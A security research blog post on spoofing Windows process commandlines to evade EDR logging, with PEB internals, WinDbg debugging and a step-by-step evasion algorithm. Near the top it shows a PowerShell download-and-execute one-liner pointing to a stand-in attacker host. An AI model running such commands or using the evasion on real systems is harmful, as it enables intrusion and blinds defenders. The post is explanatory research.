# Commandline spoofing on Windows
So, in this blogpost I wanted to cover a well-known technique with a limitation that is not well-documented.  
I hope to share some slight insights on Windows process creation and internals.  
The topic of today is spoofing process commandlines on Windows.  
To be relevant, I will only be describing the technique on 64-bit Intel architecture, which is the most prevalent Windows architecture in the world. The differences between that and other architectures are minor, and mostly come into play when examining the data structures used throughout the blogpost. Also, I will not be handling [WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/wow64-implementation-details) at all, thus targeting true 64-bit processes only.  
The differences are pretty minor though, and the reader is encouraged to attempt imiplementing my techniques on their own.

## Motivation
The technique's idea (which I haven't invented myself!) is to start a suspended process, wait a bit, and by modifying the process's memory - change its commandline and resume it.  
The main motivation for spoofing commandlines on Windows is evading [EDR](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) detections.  
Imagine an EDR that intercepts a process's commandline upon its creation and saves it in some cache - by changing the process's commandline later, an EDR might report something that looks benign but is actually malicious - think [Living-off-the-land binaries (LOLBins)](https://lolbas-project.github.io) or even script engines:

### Before
```
powershell -c "Write-Host 'This is a test'"
```

### After
```
powershell -c "iex (New-Object System.Net.WebClient).DownloadString('http://attacker-controlled.com/evil.ps1')"
```

Note this example is not great since the length of the old commandline is smaller than the new commandline length - we will discuss that shortly.

## Background - PEB, UNICODE_STRING and calling convention
I did mention what the PEB is in the past [when I talked about shellcodes](https://github.com/yo-yo-yo-jbo/msf_shellcode_analysis/), but for the sake of completion, I will mention it briefly here too.  
The [Process Environment Block (PEB)](https://en.wikipedia.org/wiki/Process_Environment_Block) is a semi-documented data structure in Windows, meant to be a semi userland copy of the kernel [EPROCESS](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm) structure.  
The motivation for keeping two structures is to save costs - for instance, by consulting the `PEB`, a process can know what DLLs are loaded to it or what commandline it has without consulting the kernel.  
Specifically, we are going to care about the fact the process's commandline is also resident in its PEB.  
Also note there is a well-known data structure for handling strings all across Windows (both in kernel and userland) - [UNICODE_STRING](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string). That data structure describes wide strings, and is *not* a flat structure:
```c
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
```

The `Buffer` points to the actual wide string (note it's just a pointer), while the `Length` corresponds to the string's length (in bytes), *excluding* the NUL terminator. Lastly, the `MaximumLength` corresponds to the string buffer's capacity (in bytes), *including* the NUL terminator.  
Note: on 64-bit systems, there is a 4-bit padding between `MaximumLength` and `Buffer` to make the `Buffer` member 8-byte aligned.

Lastly, when debugging, we will be relying a bit on the 64-bit [calling convention](https://en.wikipedia.org/wiki/Calling_convention), which means first four arguments to functions are passed via registers `rcx`, `rdx`, `r8` and `r9`.  
This is again a clear 64-bit difference (32-bit calling conventions pass arguments on the stack).

## Previous known work
In this section, I will try to describe the main logic that can be found in many places all over the internet.  
Note I have found buggy implementations as well, so in this section I will try to be extra accurate.  
Also, this algorithm (and all those proof-of-concepts) assume the old commandline length is not shorter than the new commandline length.  
I will be diving deeply into that assumption later and see what could be done about it.  
In any case, here is the complete algorithm:
1. Validate that the length of the new commandline does not exceed the length of the old commandline. That assumption will become clear in bullet number 8.
2. Create a new process using the [CreateProcessW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) API, specifying `CREATE_SUSPENDED` in its creation flags and obviously using the old commandline. We get back two `HANDLE`s - one for the created process and one for the main (and only) thread.
3. Optionally sleep for a while (e.g. using [Sleep](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep) API) to let the EDR time to capture the old (and legitimate-looking) commandline.
4. Use the [ntdll!NtQueryInformationProcess](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess) API on the process handle, with the `ProcessBasicInformation` information class. We get back a `PROCESS_BASIC_INFORMATION` structure, which has the remote process's [PEB](https://en.wikipedia.org/wiki/Process_Environment_Block) address.
5. Invoke the [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory) API to read the remote process's PEB (since we got its address). Specifically, we care about the `ProcessParameters` structure, which is a pointer.
6. Invoke the [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory) API again, this time to read the `ProcessParameters`, of type [RTL_USER_PROCESS_PARAMETERS](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters). Just like the `PEB`, `RTL_USER_PROCESS_PARAMETERS` is a semi-documented structure. Most importantly, it contains a field called `CommandLine`, of type [UNICODE_STRING](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string).
7. Note at this point we have `CommandLine.MaximumLength` (corresponds to the string buffer's capacity, in bytes, including a NUL terminator) and `CommandLine.Length` (corresponds to the string's length in characters, excluding the NUL terminator). We also have `CommandLine.Buffer`, which for all means and purposes - is a pointer.
8. We use the [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API to write our new commandline to `CommandLine.Buffer`. **This is exactly where the assumption about the commandline lengths come into play** - if the new commandline is longer than the old commandline, we write outside of the buffer!
9. We use the [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API again to update `CommandLine.Length` to the new length of the commandline (assuming it's different than the old commandline length).
10. We call the [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) API on the main thread's `HANDLE`, which resumes the entire process execution.
11. For cleanup, we invoke the [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) API on both the process and the thread `HANDLE`s.

To explain the data structures used schematically, here's some ASCII art:
```
+---------------------------+        +----------------------+     +-------------------------------+
|                           |        |                      |     |                               |
| PROCESS_BASIC_INFORMATION |  +-------> PEB                |  +----> RTL_USER_PROCESS_PARAMETERS |  +-----> Commandline (PWSTR)
| ========================= |  |     |   ===                |  |  |   =========================== |  |
| ...                       |  |     |   ...                |  |  |   ...                         |  |
| PebBaseAddresss -------------+     |   ProcessParameters ----+  |   CommandLine.Length          |  |
| ...                       |        |   ...                |     |   CommandLine.MaxiumumLength  |  |
|                           |        |                      |     |   CommandLine.Buffer ------------+
+---------------------------+        +----------------------+     |   ...                         |
                                                                  |                               |
                                                                  +-------------------------------+
```

What we basically do is resolve all those pointers, override the buffer (denoted as `Commandline (PWSTR)`) and fix `CommandLine.Length`.

## Breaking the commandline length assumption
The assumption for the new commandline to not exceed the old commandline length seems a bit silly in a first glance - can we not allocate our own `CommandLine.Buffer` using [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), write our own commandline there and set the buffer accordingly?  
Interestingly, it does not work, but it takes a while to understand why. Here is the revised algorithm:
1. Run steps 2-7 from the previous section, getting the `CommandLine` structure populated.
2. Use the [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) API to allocate a new chunk for the new commandline, including a NUL terminator (note these are wide strings, so a NUL terminator is 2 bytes), with protection `PAGE_READWRITE`. Get a resulting allocated virtual address.
3. Use the [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API to write our new commandline to the address returned.
4. Optionally use [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API to zero-out the old buffer (pointed by `CommandLine.Buffer`). That is just to remove the old commandline from memory and is not really necessary for the algorithm.
5. Update `CommandLine.MaximumLength` to the new capacity (the string's length in bytes including a NUL terminator), update `CommandLine.Length` to be the new length in bytes (excluding the NUL terminator), and `CommandLine.Buffer` to point to our newly allocated buffer.
6. Use the [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API to commit those changes to the remote process.
7. As before, use [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) to resume process execution, and [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) for cleanup purposes.

This algorithm looks promising, and in fact, before calling [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread), tools like [ProcessExplorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer) will show the new commandline if refreshed, proving our algorithm works!  
However, resuming the thread brings up a horrible truth, in an awful error message:
```
The application was unable to start correctly (0xC0000142). Click OK to close the application.
```

This requires some debugging, as our algorithm should work in principal!

## Debugging the problem
At this point, I set up my debugger [WinDbg](https://en.wikipedia.org/wiki/WinDbg) and attach to the suspended process just before calling [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread). As expected, everything actually seems to be in order:

```
0:001> !peb
PEB at 0000005615f57000
    InheritedAddressSpace:    No
    ReadImageFileExecOptions: No
    BeingDebugged:            Yes
    ImageBaseAddress:         00007ff6e4fa0000
    NtGlobalFlag:             0
    NtGlobalFlag2:            0
    Ldr                       0000000000000000
    *** unable to read Ldr table at 0000000000000000
    SubSystemData:     0000000000000000
    ProcessHeap:       0000000000000000
    ProcessParameters: 000001b0a1330000
    CurrentDirectory:  'C:\temp\'
    WindowTitle:  'C:\Windows\system32\cmd.exe'
    ImageFile:    'C:\Windows\system32\cmd.exe'
    CommandLine:  'C:\Windows\system32\cmd.exe /c echo looooooong'
    DllPath:      '< Name not readable >'
    Environment:  000001b0a1330734
        =::=::\
        =C:=C:\temp
        =ExitCode=00000000
        ALLUSERSPROFILE=C:\ProgramData
   ...
```

However, after resumption we get a crash:

```
0:001> g
ModLoad: 00007ff8`7e830000 00007ff8`7e8f9000   C:\WINDOWS\System32\KERNEL32.DLL
ModLoad: 00007ff8`7d480000 00007ff8`7d872000   C:\WINDOWS\System32\KERNELBASE.dll
(30f0.2954): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
ntdll!RtlUnicodeStringToAnsiString+0x159:
00007ff8`7fef60a9 410fb70451      movzx   eax,word ptr [r9+rdx*2] ds:000001b0`a16456e0=????
0:000> k
 # Child-SP          RetAddr               Call Site
00 00000056`160fe540 00007ff8`7d4aeaa7     ntdll!RtlUnicodeStringToAnsiString+0x159
01 00000056`160fe5e0 00007ff8`7d53d03d     KERNELBASE!_KernelBaseBaseDllInitialize+0x497
02 00000056`160fe850 00007ff8`7ff9f89e     KERNELBASE!KernelBaseDllInitialize+0xd
03 00000056`160fe8a0 00007ff8`7fe4bcae     ntdll!LdrpCallInitRoutineInternal+0x22
04 00000056`160fe8d0 00007ff8`7fe497ac     ntdll!LdrpCallInitRoutine+0x10e
05 00000056`160fe940 00007ff8`7fed76ea     ntdll!LdrpInitializeNode+0x19c
06 00000056`160fea50 00007ff8`7fed7716     ntdll!LdrpInitializeGraphRecurse+0x6a
07 00000056`160fea90 00007ff8`7fed6203     ntdll!LdrpInitializeGraphRecurse+0x96
08 00000056`160fead0 00007ff8`7fe56414     ntdll!LdrpPrepareModuleForExecution+0xef
09 00000056`160feb10 00007ff8`7fe56020     ntdll!LdrpLoadDllInternal+0x284
0a 00000056`160feba0 00007ff8`7fe7fa20     ntdll!LdrpLoadDll+0x100
0b 00000056`160fed70 00007ff8`7fed8b04     ntdll!LdrLoadDll+0x170
0c 00000056`160fee60 00007ff8`7fefd6a5     ntdll!LdrpInitializeKernel32Functions+0xc0
0d 00000056`160ff000 00007ff8`7fefba50     ntdll!LdrpInitializeProcess+0x1951
0e 00000056`160ff430 00007ff8`7fefb83a     ntdll!LdrpInitialize+0x16c
0f 00000056`160ff4b0 00007ff8`7ff2910e     ntdll!LdrpInitializeInternal+0x5a
10 00000056`160ff500 00000000`00000000     ntdll!LdrInitializeThunk+0xe
```

What's going on? We see a crash in [ntdll!RtlUnicodeStringToAnsiString](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlunicodestringtoansistring).  
Debugging it further, it's obvious the input `UNICODE_STRING` is corrupted, e.g., when setting a breakpoint on `RtlUnicodeStringToAnsiString` and displaying the 2nd argument (`rdx`):

```
0:001> bu ntdll!RtlUnicodeStringToAnsiString
0:001> g
ModLoad: 00007ff8`7e830000 00007ff8`7e8f9000   C:\WINDOWS\System32\KERNEL32.DLL
ModLoad: 00007ff8`7d480000 00007ff8`7d872000   C:\WINDOWS\System32\KERNELBASE.dll
Breakpoint 0 hit
ntdll!RtlUnicodeStringToAnsiString:
00007ff8`7fef5f50 4c8bdc          mov     r11,rsp
0:000> dt _UNICODE_STRING @rdx
ntdll!_UNICODE_STRING
 "--- memory read error at address 0x00000220`a56956e0 ---"
   +0x000 Length           : 0x5c
   +0x002 MaximumLength    : 0x5e
   +0x008 Buffer           : 0x00000220`a56956e0  "--- memory read error at address 0x00000220`a56956e0 ---"
```

The `Length` and `MaximumLength` seem to be okay, but the buffer does not make sense, especially if comparing the buffer address we got from [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) and the value of the `Buffer` member here. At some point after resuming the thread, the address gets overridden!  
Setting a [hardware breakpoint](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/ba--break-on-access-) shows the culprit is an internal function `ntdll!RtlpCreateHeap`, which has nothing to do with the CommandLine buffer.  

### Who moved my structure?
After some more debugging, I realized there is a slight change that I haven't noticed before - my entire `ProcessParameters` pointer in the `PEB` changes!  

#### Before
```
0:001> dt _PEB 000000e78b973000
ntdll!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0x4 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 IsPackagedProcess : 0y0
   +0x003 IsAppContainer   : 0y0
   +0x003 IsProtectedProcessLight : 0y0
   +0x003 IsLongPathAwareProcess : 0y0
   +0x004 Padding0         : [4]  ""
   +0x008 Mutant           : 0xffffffff`ffffffff Void
   +0x010 ImageBaseAddress : 0x00007ff6`e4fa0000 Void
   +0x018 Ldr              : (null) 
   +0x020 ProcessParameters : 0x000002a4`5f290000 _RTL_USER_PROCESS_PARAMETERS
   ...
```

#### After
```
0:000> dt _PEB 000000e78b973000
ntdll!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0x4 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 IsPackagedProcess : 0y0
   +0x003 IsAppContainer   : 0y0
   +0x003 IsProtectedProcessLight : 0y0
   +0x003 IsLongPathAwareProcess : 0y0
   +0x004 Padding0         : [4]  ""
   +0x008 Mutant           : 0xffffffff`ffffffff Void
   +0x010 ImageBaseAddress : 0x00007ff6`e4fa0000 Void
   +0x018 Ldr              : 0x00007ff8`80012900 _PEB_LDR_DATA
   +0x020 ProcessParameters : 0x000002a4`5f3956e0 _RTL_USER_PROCESS_PARAMETERS
   ...
```

See how the `ProcessParameters` changed from `0x000002a45f290000` to `0x000002a45f3956e0`? That is quite odd!  
Luckily, we can again set up a hardware breakpoint and find who changes that pointer:

```
0:001> dt 0x0000009e60bf1000 ntdll!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0x4 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 IsPackagedProcess : 0y0
   +0x003 IsAppContainer   : 0y0
   +0x003 IsProtectedProcessLight : 0y0
   +0x003 IsLongPathAwareProcess : 0y0
   +0x004 Padding0         : [4]  ""
   +0x008 Mutant           : 0xffffffff`ffffffff Void
   +0x010 ImageBaseAddress : 0x00007ff6`e4fa0000 Void
   +0x018 Ldr              : (null) 
   +0x020 ProcessParameters : 0x000001bc`b29a0000 _RTL_USER_PROCESS_PARAMETERS
    ...
0:001> ba w 8 0x0000009e60bf1000+0x20
0:001> g
Breakpoint 0 hit
ntdll!RtlpInitParameterBlock+0x111:
00007ff8`7ff373f9 4c8d442438      lea     r8,[rsp+38h]
0:000> k
 # Child-SP          RetAddr               Call Site
00 0000009e`609ef1d0 00007ff8`7fefc930     ntdll!RtlpInitParameterBlock+0x111
01 0000009e`609ef200 00007ff8`7fefba50     ntdll!LdrpInitializeProcess+0xbdc
02 0000009e`609ef630 00007ff8`7fefb83a     ntdll!LdrpInitialize+0x16c
03 0000009e`609ef6b0 00007ff8`7ff2910e     ntdll!LdrpInitializeInternal+0x5a
04 0000009e`609ef700 00000000`00000000     ntdll!LdrInitializeThunk+0xe
```

Ah, we have a suspect, `ntdll!RtlpInitParameterBlock`!  
At this point, I found [an amazing blogpost](https://l--k.uk/2022/03/05/command-line-tampering-in-windows-part-iii/) from 2022 by `L<<K` - which is the only blogpost that I was able to find that talks about the issue.  
In essence, when the process starts (but after we resume its main thread), it calls `RtlpInitParameterBlock`, which does the following pseudo code:

```c
PPEB ptPeb = NtCurrentPeb();
PRTL_USER_PROCESS_PARAMETERS ptOldParams = ptPeb->ProcessParameters;
PRTL_USER_PROCESS_PARAMETERS ptNewParams = NULL;
DWORD cbBytes = ptOldParameters->Length;
...
ptNewParam = RtlAllocateHeap(RtlProcessHeap(), 0, cbBytes);
...
RtlCopyMemory(ptNewParams, ptOldParames, cbBytes);
...
PBYTE pcDiff = (PBYTE)ptNewParams - (PBYTE)ptOldParams;
if (NULL != ptNewParams->CurrentDirectory.DosPath.Buffer) { (PBYTE)(ptNewParams->CurrentDirectory.DosPath.Buffer) += pcDiff; }
if (NULL != ptNewParams->DllPath.Buffer) { (PBYTE)(ptNewParams->DllPath.Buffer) += pcDiff; }
if (NULL != ptNewParams->ImagePathName.Buffer) { (PBYTE)(ptNewParams->ImagePathName.Buffer) += pcDiff; }
if (NULL != ptNewParams->CommandLine.Buffer) { (PBYTE)(ptNewParams->CommandLine.Buffer) += pcDiff; }
if (NULL != ptNewParams->WindowTitle.Buffer) { (PBYTE)(ptNewParams->WindowTitle.Buffer) += pcDiff; }
if (NULL != ptNewParams->DesktopInfo.Buffer) { (PBYTE)(ptNewParams->DesktopInfo.Buffer) += pcDiff; }
if (NULL != ptNewParams->ShellInfo.Buffer) { (PBYTE)(ptNewParams->ShellInfo.Buffer) += pcDiff; }
if (NULL != ptNewParams->RuntimeData.Buffer) { (PBYTE)(ptNewParams->RuntimeData.Buffer) += pcDiff; }
if (NULL != ptNewParams->RedirectionDllName.Buffer) { (PBYTE)(ptNewParams->RedirectionDllName.Buffer) += pcDiff; }
...
ptPeb->ProcessParameters = ptNewParams;
...
```

You can figure out most of this from [Geoff Chapell's documentation of RTL_USER_PROCESS_PARAMETERS](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/rtl_user_process_parameters.htm) without hardcore reverse engineering.  
In essence, this function does the following:
1. Allocate a new `RTL_USER_PROCESS_PARAMETERS` on the current process default heap, **with the size derived from the Length member of the old RTL_USER_PROCESS_PARAMETERS**. This is going to be critical, as this size **exceeds the size of RTL_USER_PROCESS_PARAMETERS**.
2. Copy the old parmaeters to the newly allocated chunk.
3. Calculate the difference in pointers between the old parameters and the new ones, and fix various `Buffer` members in various `UNICODE_STRING`s, including our CommandLine's.
4. Set the `PEB`'s ProcessParameters to be the newly allocated parameters.

The conclusion here - since `RTL_USER_PROCESS_PARAMETERS` is not a flat structure, and since we see one memory copy, we conclude that this function relies on those `UNICODE_STRING` Buffer members to be adjacent to the `RTL_USER_PROCESS_PARAMETERS`! In fact, that's the entire point of the `Length` member in `RTL_USER_PROCESS_PARAMETERS` - it seems to encompass the entire sturcture plus those buffers. That is also the reason there is a "fix" for all those buffers!  
Why does Windows do that? Well, the initial `RTL_USER_PROCESS_PARAMETERS` was set up by the kernel and allocated via crude virtual memory allocations, thus taking more space (and owned by the kernel).  
Thus, there is a desire to free that memory, but before doing that - the process takes ownership and also uses its own heap, which allows for fine-grained allocations (not page-sized necessarily).

All that also means we have to update our mental image of the structures, and our ASCII art:
```
+---------------------------+        +----------------------+     +-------------------------------+    <----------+
|                           |        |                      |     |                               |               |
| PROCESS_BASIC_INFORMATION |  +-------> PEB                |  +----> RTL_USER_PROCESS_PARAMETERS |               |
| ========================= |  |     |   ===                |  |  |   =========================== |               |
| ...                       |  |     |   ...                |  |  |   ...                         |               |
| PebBaseAddresss -------------+     |   ProcessParameters ----+  |   Length --- (encompasses) -------------------+
| ...                       |        |   ...                |     |   ...                         |               |
|                           |        |                      |     |   CommandLine.Buffer ---------------------+   |
+---------------------------+        +----------------------+     |   ...                         |           |   |
                                                                  |   DllPath.Buffer ---------------------+   |   |
                                                                  |   ...                         |       |   |   |
                                                                  |   ImagePathName.Buffer -----------+   |   |   |
                                                                  |   (more UNICODE_STRINGs etc.) |   |   |   |   |
                                                                  +-------------------------------+   |   |   |   |
                                                                  |                               |   |   |   |   |
                                                                  |   Commandline (PWSTR) <-------------------+   |
                                                                  |                               |   |   |       |
                                                                  |   DllPath (PWSTR) <-------------------+       |
                                                                  |                               |   |           |
                                                                  |   ImagePathName (PWSTR) <---------+           |
                                                                  |   ... (more buffers)          |               |
                                                                  |                               |               |
                                                                  +-------------------------------+    <----------+
```

Note how all the `UNICODE_STRING` buffers point to `PWSTR`s that are adjacent to the `RTL_USER_PROCESS_PARAMETERS`, and how the undocumented `Length` member of `RTL_USER_PROCESS_PARAMETERS` encompasses both of them.

## Getting rid of the assumption
In [his blogpost]((https://l--k.uk/2022/03/05/command-line-tampering-in-windows-part-iii/)), `L<<K` suggests to create your own fake `RTL_USER_PROCESS_PARAMETERS` structure, populate it (including all the different buffers that are supposed to immediately follow it, and, most importantly - the `Length` member) and override it all - this certainly works, as the assumption does not break.  
However, when it comes to coding those kinds of techniques, I am quite conservative. Relying on an undocumented Length member in the `RTL_USER_PROCESS_PARAMETERS` might be a bit scary between OS versions, as well as incorporating future `UNICODE_STRING`s that Microsoft might decide to add to that structure.  
Instead, I took a different approach.
- I noticed that the only DLL loaded to the process when it starts suspended is `ntdll.dll` (besides, of course, the main executable PE image).
- By debugging, I realized that when `kernel32.dll` is loaded, `ntdll!RtlpInitParameterBlock` has already done its job.
- Thus, if I can delay the `RTL_USER_PROCESS_PARAMETERS` patching, I could go with my original plan of invoking [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) and so on.

The best way to achieve something like that is debugging the created process - so, when invoking [CreateProcessW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw), instead of supplying `CREATE_SUSPENDED` as the creation flags - I supply `DEBUG_ONLY_THIS_PROCESS`.  
This puts me in a state where I can invoke [WaitForDebugEvent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-waitfordebugevent) in a loop, until I see `kernel32.dll`, each time using [ContinueDebugEvent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-continuedebugevent).  
I also used a little trick - since `kernel32.dll` is a **KnownDll**, it will be loaded to all processes in the same base address. I wrote about this behavior [in a previous blogpost](https://github.com/yo-yo-yo-jbo/virtual_memory_known_dlls), and use it here - I just compare my own `kernel32.dll` base address with the one reported in the [DEBUG_EVENT](https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-debug_event) that specifies DLL loads.  
Once `kernel32.dll` is loaded, I simply return to my original plan (allocate buffer with [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), write the buffer and update the CommandLine member of `RTL_USER_PROCESS_PARAMETERS`). Then, I detach my debugger and let the process run. Done!

### The algorithm
Here is my final algorithm:
1. Create a new process using the [CreateProcessW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) API, specifying `DEBUG_ONLY_THIS_PROCESS` in its creation flags and obviously using the old commandline. We get back two `HANDLE`s - one for the created process and one for the main (and only) thread.
2. Optionally sleep for a while (e.g. using [Sleep](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep) API) to let the EDR time to capture the old (and legitimate-looking) commandline.
3. Get my own `kernel32.dll` base address (via [GetModuleHandleW](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlew)) and then, in a loop:
     1. Invoke [WaitForDebugEvent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-waitfordebugevent) API and get back the [DEBUG_EVENT](https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-debug_event).
     2. If we got `CREATE_PROCESS_DEBUG_EVENT`, close the file handle via [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle).
     3. If we got `LOAD_DLL_DEBUG_EVENT`, close the file handle via [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) but also compare our own `kernel32.dll` base address with the newly loaded DLL base address. If they match - break out of the loop.
     4. Invoke [ContinueDebugEvent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-continuedebugevent) and continue to the next iteration.
4. Now that `kernel32.dll` was loaded, go with the original plan:
     1. Use the [ntdll!NtQueryInformationProcess](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess) API on the process handle, with the `ProcessBasicInformation` information class. We get back a `PROCESS_BASIC_INFORMATION` structure, which has the remote process's [PEB](https://en.wikipedia.org/wiki/Process_Environment_Block) address.
     2. Invoke the [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory) API to read the remote process's PEB (since we got its address). Specifically, we care about the `ProcessParameters` structure, which is a pointer.
     3. Invoke the [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory) API again, this time to read the `ProcessParameters`, of type [RTL_USER_PROCESS_PARAMETERS](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters).
     4. Use [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API to zero-out the old buffer (pointed by `CommandLine.Buffer`).
     5. Use the [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) API to allocate a new chunk for the new commandline, including a NUL terminator (note these are wide strings, so a NUL terminator is 2 bytes), with protection `PAGE_READWRITE`. Get a resulting allocated virtual address.
     6. Use the [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API to write our new commandline to the address returned.
     7. Update `CommandLine.MaximumLength` to the new capacity (the string's length in bytes including a NUL terminator), update `CommandLine.Length` to be the new length in bytes (excluding the NUL terminator), and `CommandLine.Buffer` to point to our newly allocated buffer.
     8. Use the [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API to commit those changes to the remote process.
5. At this point everything is set and we just need to detach. Detaching is not terrible but requires careful handling:
     1. We invoke [SuspendThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread) API to suspend the main thread. We do that because we want to exhaust the debug queue, without generating new debug events. We also know at this point the remote process is only single-threaded, so suspending the main thread is sufficient.
     2. We call [ContinueDebugEvent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-continuedebugevent) on the original `kernel32.dll` loading debug event.
     3. In a loop, we call [WaitForDebugEvent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-waitfordebugevent), close any open file handle with [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) and invoking [ContinueDebugEvent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-continuedebugevent).
     4. Call [DebugActiveProcessStop](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocessstop) API to detach.
     5. Finally, we call [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) on the main thread to resume the process.

### Implementation
I have uploaded my own implementation to the [CmdSpoofer](CmdSpoofer) directory. It's a simple Visual Studio project that has the following files:
- `Auxiliary.h` - my own header file I sometimes use for useful macros.
- `Spoofer.h` - the header file for the commandline spoofer.
- `Spoofer.c` - implementation for the commandline spoofer.
- `Main.c` - main entry point and shows how to use the spoofer module.

Using as a black-box is easy - just include `Spoofer.h` and invoke `SPOOFER_Spawn`.  
I made sure to document everything.

## Summary
In this blogpost we've discussed some familiar ideas (`PEB` and so on), did some minor Windows internals (on the transition of `RTL_USER_PROCESS_PARAMETERS` from kernel memory to userland memory), and even did some debugging - both with `windbg` as well as implementing our own "debugger" for delaying of the commandline patching!

Stay tuned!

Jonathan Bar Or
